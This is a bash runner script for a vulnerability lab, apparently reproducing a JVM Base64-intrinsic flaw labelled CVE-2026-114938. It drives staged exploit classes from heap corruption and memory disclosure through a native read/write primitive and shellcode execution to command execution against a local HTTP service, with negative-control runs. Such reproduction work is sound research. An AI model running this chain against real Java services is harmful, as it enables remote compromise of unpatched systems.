#!/usr/bin/env bash
# Java4Shell (CVE-2026-114938) lab runner.
#
# Usage: run-lab [trigger|control|corrupt|leak|write|chain|chain-control|native|codecache|codecache-control|rce|rce-control|all]
#
#   trigger       bounded, non-destructive OOB-write measurement
#   control       same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
#   corrupt       overwrite a neighbouring array's length + OOB read
#   leak          JavaBleed-style heap disclosure (marker in a neighbour array)
#   write         use the corrupted length for a chosen-value OOB write
#   chain         writer -> reader -> forged header -> repair + GC survival
#   chain-control same chain with -XX:-UseBASE64Intrinsics (must not reproduce)
#   native        corrupt a DirectByteBuffer address -> 64-bit native read/write
#   codecache     overwrite a compiled method -> shellcode execution (exit 42)
#   codecache-control  same with -XX:-UseBASE64Intrinsics (must not reproduce)
#   rce           controlled RCE against a local service (application sink)
#   rce-control   same as rce, but with -XX:-UseBASE64Intrinsics (must not reproduce)
#   all           run every stage (default)
#
# Environment:
#   LAB_MODE=native|sde|auto   (default auto)
#   LAB_WARMUP=N               (default 1000; use 200000 for a fully warm
#                               decoder without -Xcomp on real hardware)
#   LAB_RCE_CMD="..."          command the RCE client asks the target to run

set -uo pipefail

MODE="${LAB_MODE:-auto}"
TEST="${1:-all}"
WARMUP="${LAB_WARMUP:-1000}"
CLASSES=/opt/lab/classes
SDE=/opt/sde/sde64

JVM_OPTS=(-Xcomp -XX:-TieredCompilation)
EXTRA_OPTS=()
# JIT-only options for the controlled RCE stage: compile the Base64 decoder
# (and only that) with C2, so the AVX-512 stub is generated without paying
# the cost of compiling the whole HttpServer under SDE.
RCE_OPTS=(-Xcomp -XX:-TieredCompilation \
          -XX:+UnlockExperimentalVMOptions -XX:+UseEpsilonGC \
          -Xms512m -Xmx512m)

cpu_has_avx512() {
    # All four are required by the vulnerable decoder.
    [ "$(uname -m)" = "x86_64" ] || return 1
    for f in avx512f avx512bw avx512vbmi bmi2; do
        grep -qw "$f" /proc/cpuinfo || return 1
    done
    return 0
}

case "$MODE" in
    native)
        RUNNER=(java)
        ;;
    sde)
        RUNNER=("$SDE" -chip_check_disable -icx -- java)
        ;;
    auto)
        if cpu_has_avx512; then
            RUNNER=(java)
            MODE=native
        else
            RUNNER=("$SDE" -chip_check_disable -icx -- java)
            MODE=sde
        fi
        ;;
    *)
        echo "LAB_MODE must be native, sde or auto" >&2
        exit 2
        ;;
esac

RUNNER_NAME="${RUNNER[0]##*/}"

run() {
    local cls="$1"
    shift
    "${RUNNER[@]}" "${JVM_OPTS[@]}" "${EXTRA_OPTS[@]}" -cp "$CLASSES" "$cls" "$@"
}

banner() {
    echo
    echo "==================================================================="
    echo " $1"
    echo " runner=$RUNNER_NAME  mode=$MODE  warmup=$WARMUP"
    echo "==================================================================="
}

do_trigger() {
    EXTRA_OPTS=()
    banner "bounded trigger (real 64-byte masked store)"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_control() {
    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
    banner "control: -XX:-UseBASE64Intrinsics"
    run Base64Trigger --warmup "$WARMUP" --show-bytes
}

do_corrupt() {
    EXTRA_OPTS=()
    banner "heap corruption: victim array length + OOB read"
    run HeapCorruption --warmup "$WARMUP" --dst-size 66 --show-length --oob-index 4096
}

do_leak() {
    EXTRA_OPTS=()
    banner "JavaBleed: read a neighbouring secret array"
    run HeapLeak --warmup "$WARMUP" --scan 8192
}

do_write() {
    EXTRA_OPTS=()
    banner "heap read/write: chosen-value OOB write into a neighbour"
    run HeapWrite --warmup "$WARMUP"
}

do_chain() {
    EXTRA_OPTS=()
    banner "second half: writer -> reader -> forged header -> repair + GC"
    run Chain --warmup "$WARMUP"
}

do_chain_control() {
    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
    banner "control: second half with -XX:-UseBASE64Intrinsics"
    run Chain --warmup "$WARMUP"
    local rc=$?
    if [ "$rc" = 1 ]; then
        # Exit 1 from Chain means "length unchanged" - the expected control result.
        echo "[chain-control] OK: no corruption without the vulnerable intrinsic"
        return 0
    fi
    return "$rc"
}

do_native() {
    EXTRA_OPTS=()
    banner "native: corrupted DirectByteBuffer.address -> 64-bit read/write"
    run NativeProbe --warmup "$WARMUP"
}

do_codecache() {
    EXTRA_OPTS=()
    banner "code cache: overwrite compiled method -> shellcode execution"
    run CodeCacheRce --warmup "$WARMUP"
    local rc=$?
    # The shellcode calls exit_group(42); that status is the success marker.
    if [ "$rc" = 42 ]; then
        echo "[codecache] OK: shellcode executed (exit 42)"
        return 0
    fi
    return "$rc"
}

do_codecache_control() {
    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
    banner "control: code cache stage with -XX:-UseBASE64Intrinsics"
    run CodeCacheRce --warmup "$WARMUP"
    local rc=$?
    if [ "$rc" = 1 ]; then
        echo "[codecache-control] OK: no corruption without the vulnerable intrinsic"
        return 0
    fi
    return "$rc"
}

rce_run() {
    # $1 = mode label, $2 = extra JVM flags (space-free array passed via name)
    local label="$1"
    local extra_mode="$2"
    local port=18080
    local log="/tmp/rce-server-${label}.log"
    : > "$log"

    local -a opts=("${RCE_OPTS[@]}")
    if [ "$extra_mode" = "control" ]; then
        opts+=(-XX:-UseBASE64Intrinsics)
    fi

    banner "controlled RCE: ${label} (heap corruption -> OOB read -> exec)"
    "${RUNNER[@]}" "${opts[@]}" -cp "$CLASSES" RceLab --port "$port" --warmup "$WARMUP" >>"$log" 2>&1 &
    local pid=$!
    cleanup() { kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; }
    trap 'cleanup' RETURN INT TERM

    local up=0
    for i in $(seq 1 900); do
        if curl -fsS "http://127.0.0.1:$port/health" >/dev/null 2>&1; then up=1; break; fi
        if ! kill -0 "$pid" 2>/dev/null; then break; fi
        sleep 1
    done

    if [ "$up" != 1 ]; then
        echo "server failed to start (see $log)"
        tail -40 "$log"
        return 1
    fi
    echo "server ready (pid $pid)"

    local rc=0
    java -cp "$CLASSES" RceClient "http://127.0.0.1:$port" "${LAB_RCE_CMD:-${RCE_CMD:-id; uname -a}}" || rc=$?

    # In control mode, the expected result is "no corruption", i.e. client exit 1.
    if [ "$extra_mode" = "control" ]; then
        if [ "$rc" = 1 ]; then
            echo "[rce-control] OK: no RCE without the vulnerable intrinsic"
            rc=0
        fi
    fi

    cleanup
    trap - RETURN INT TERM
    return "$rc"
}

do_rce() {
    rce_run "vulnerable" "vuln"
}

do_rce_control() {
    rce_run "control" "control"
}

case "$TEST" in
    trigger) do_trigger ;;
    control) do_control ;;
    corrupt) do_corrupt ;;
    leak)    do_leak ;;
    write)   do_write ;;
    chain)   do_chain ;;
    chain-control) do_chain_control ;;
    native)  do_native ;;
    codecache) do_codecache ;;
    codecache-control) do_codecache_control ;;
    rce)     do_rce ;;
    rce-control) do_rce_control ;;
    all)
        do_trigger; echo "[trigger] exit=$?"
        do_control; echo "[control] exit=$?"
        do_corrupt; echo "[corrupt] exit=$?"
        do_leak;    echo "[leak]    exit=$?"
        do_write;   echo "[write]   exit=$?"
        do_chain;   echo "[chain]   exit=$?"
        do_native;  echo "[native]  exit=$?"
        do_codecache; echo "[codecache] exit=$?"
        echo
        echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
        echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
        echo "write=OOB WRITE REPRODUCED, chain=CHAIN COMPLETE,"
        echo "native=NATIVE PRIMITIVE REACHED,"
        echo "codecache=shellcode executed (exit 42)."
        echo
        echo "Optional: ./run.sh chain-control    (negative control for chain)"
        echo "          ./run.sh rce              (application sink, ~3 min)"
        echo "          ./run.sh rce-control      (negative control for rce)"
        ;;
    *)
        echo "usage: $0 [trigger|control|corrupt|leak|write|chain|chain-control|native|codecache|codecache-control|rce|rce-control|all]" >&2
        exit 2
        ;;
esac
